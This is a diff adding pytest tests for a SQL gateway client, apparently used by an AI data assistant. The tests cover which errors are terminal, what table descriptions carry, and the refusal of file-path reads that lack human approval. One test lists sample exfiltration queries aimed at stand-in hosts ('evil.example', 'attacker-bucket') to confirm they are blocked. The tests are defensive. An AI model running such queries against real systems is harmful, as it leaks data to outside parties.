@@ -1088,3 +1088,127 @@ def test_translate_429_is_a_limit_with_its_reason():
         _status_error(429, {"error": "draft_quota_exceeded", "detail": "Try again in 12 minutes."})
     )
     assert str(err) == "Limit reached: Try again in 12 minutes."
+
+
+@pytest.mark.parametrize(
+    ("code", "body", "terminal"),
+    [
+        # Nothing the model can send will change these.
+        (403, {"detail": "no grant"}, True),
+        (422, {"error": "grant_denied", "detail": "no grant on sales.orders"}, True),
+        (403, {"error": "agent_forbidden", "detail": "no"}, True),
+        (409, {"error": "catalog_read_only", "detail": "migrating"}, True),
+        (422, {"error": "agent_required", "detail": "x"}, True),
+        (503, {"error": "no_compute_available", "detail": "x"}, True),
+        (503, {"error": "default_compute_unavailable", "detail": "agent main"}, True),
+        (429, {"error": "compute_queue_full", "detail": "x"}, True),
+        (429, {"detail": "slow down"}, True),
+        (503, {"detail": "agent offline"}, True),
+        (500, "boom", True),
+        (502, {"detail": "upstream"}, True),
+        # A different name, or different SQL, can.
+        (404, {"detail": "no such table"}, False),
+        (422, {"error": "sql_not_allowed", "detail": "ATTACH is denied"}, False),
+        (422, {"error": "statement_not_allowed", "detail": "x"}, False),
+        (422, {"detail": "bad value"}, False),
+        (409, {"detail": "already exists"}, False),
+        (400, {"detail": "bad"}, False),
+    ],
+)
+def test_a_failure_is_terminal_only_when_asking_differently_cannot_change_it(code, body, terminal):
+    assert _translate(_status_error(code, body)).terminal is terminal
+
+
+def test_a_gateway_error_is_retryable_unless_it_says_otherwise():
+    assert GatewayError("x").terminal is False
+    assert GatewayError("x", terminal=True).terminal is True
+
+
+@respx.mock
+async def test_describe_table_carries_what_the_author_said_and_only_that():
+    respx.get("http://assistant.internal/workspaces/ws/catalogs/c/schemas/s/tables/t").mock(
+        return_value=httpx.Response(
+            200,
+            json={
+                "name": "t",
+                "row_count": 5,
+                "size_bytes": 10,
+                "properties": {"comment": "One row per paying customer.", "other": "x"},
+                "columns": [
+                    {"name": "mrr", "type": "long", "nullable": False, "description": "MRR, cents"},
+                    {"name": "id", "type": "long", "nullable": False, "description": None},
+                ],
+            },
+        )
+    )
+    async with httpx.AsyncClient(base_url="http://assistant.internal") as client:
+        described = await _gateway(client).describe_table("c", "s", "t")
+
+    assert described["comment"] == "One row per paying customer."
+    assert described["columns"] == [
+        {"name": "mrr", "type": "long", "nullable": False, "description": "MRR, cents"},
+        {"name": "id", "type": "long", "nullable": False},
+    ]
+
+
+@respx.mock
+async def test_describe_table_has_no_comment_key_when_the_table_has_none():
+    respx.get("http://assistant.internal/workspaces/ws/catalogs/c/schemas/s/tables/t").mock(
+        return_value=httpx.Response(
+            200, json={"name": "t", "columns": [{"name": "id", "type": "long", "nullable": True}]}
+        )
+    )
+    async with httpx.AsyncClient(base_url="http://assistant.internal") as client:
+        described = await _gateway(client).describe_table("c", "s", "t")
+
+    assert "comment" not in described
+
+
+@pytest.mark.parametrize(
+    "sql",
+    [
+        "SELECT * FROM read_csv('https://evil.example/?d=secret')",
+        "SELECT * FROM read_parquet('s3://attacker-bucket/exfil.parquet')",
+        "SELECT * FROM 'https://evil.example/x.csv'",
+    ],
+)
+async def test_a_read_by_path_is_refused_before_anything_is_sent(sql):
+    """No request is made: nothing is mocked, so one would fail the test differently."""
+    async with httpx.AsyncClient(base_url="http://assistant.internal") as client:
+        with pytest.raises(GatewayError) as caught:
+            await _gateway(client).run_sql(sql, catalog=None, timeout_s=5)
+
+    assert caught.value.kind == "denied"
+    assert caught.value.terminal is True
+    assert "by path is not allowed" in str(caught.value)
+
+
+@respx.mock
+async def test_a_read_by_path_that_a_person_approved_is_sent():
+    sql = "INSERT INTO orders SELECT * FROM read_parquet('s3://bucket/new.parquet')"
+    route = respx.post("http://assistant.internal/workspaces/ws/queries").mock(
+        return_value=httpx.Response(201, json={"id": "q1", "status": "done"})
+    )
+    respx.get("http://assistant.internal/queries/q1/rows").mock(
+        return_value=httpx.Response(200, json={"rows": [], "columns": [], "total": 0})
+    )
+    async with httpx.AsyncClient(base_url="http://assistant.internal") as client:
+        await _gateway(client).run_sql(sql, catalog=None, timeout_s=5, approved=True)
+
+    assert route.called
+
+
+@respx.mock
+async def test_a_query_over_tables_is_sent_as_before():
+    route = respx.post("http://assistant.internal/workspaces/ws/queries").mock(
+        return_value=httpx.Response(201, json={"id": "q1", "status": "done"})
+    )
+    respx.get("http://assistant.internal/queries/q1/rows").mock(
+        return_value=httpx.Response(200, json={"rows": [], "columns": [], "total": 0})
+    )
+    async with httpx.AsyncClient(base_url="http://assistant.internal") as client:
+        await _gateway(client).run_sql(
+            "SELECT * FROM sales.analytics.orders", catalog=None, timeout_s=5
+        )
+
+    assert route.called
